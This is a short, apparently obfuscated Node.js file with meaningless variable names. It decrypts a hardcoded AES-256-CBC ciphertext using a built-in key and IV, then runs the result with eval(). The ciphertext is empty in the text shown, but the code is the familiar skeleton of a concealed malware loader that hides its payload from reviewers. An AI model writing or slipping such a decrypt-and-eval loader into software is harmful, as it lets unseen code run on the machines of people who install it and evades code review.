const ito = require('crypto');
const itinho = Buffer.from('820d41ca6e70bdcc50a712ed72646175bc9c3f1918f146cb46924fbac1966771', 'hex');
const octua = Buffer.from('136c7f57e546b204dc34d5d4d1a5b02e', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
